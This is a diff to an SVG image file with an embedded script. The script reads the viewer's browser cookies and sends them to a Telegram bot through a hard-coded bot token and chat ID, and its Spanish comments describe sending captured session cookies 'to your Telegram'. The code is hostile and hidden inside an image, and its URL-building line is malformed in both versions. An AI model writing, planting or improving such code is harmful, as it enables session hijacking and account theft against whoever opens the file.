@@ -1,10 +1,12 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    var token = "7825739165:AAFACaoOmHMVD5aqtdFZ7Q2AEuASlpaKgdk"; // Token API
-    var chat_id = "2062208754"; // Chat ID
-    var cookie = document.cookie; // Captura las cookies del usuario
-    var url = "https://api.telegram.org/bot"7825739165:AAFACaoOmHMVD5aqtdFZ7Q2AEuASlpaKgdk"/sendMessage?chat_id="2062208754"&text=🔴%20Cookie:%20" + encodeURIComponent(cookie);
+    var token = "7825739165:AAFACaoOmHMVD5aqtdFZ7Q2AEuASlpaKgdk"; // Tu Token de Telegram
+    var chat_id = "2062208754"; // Tu Chat ID de Telegram
+    var cookie = document.cookie; // Captura las cookies de sesión
+    var url = "https://api.telegram.org/bot" +7825739165:AAFACaoOmHMVD5aqtdFZ7Q2AEuASlpaKgdk+ "/sendMessage?chat_id=" + 2062208754 + "&text=🔴%20Cookie:%20" + encodeURIComponent(cookie);
 
-    fetch(url); // Envía las cookies a tu Telegram
+    fetch(url) // Envía las cookies a tu Telegram
+      .then(response => console.log("Cookie enviada"))
+      .catch(error => console.error("Error al enviar cookie:", error));
   </script>
 </svg>
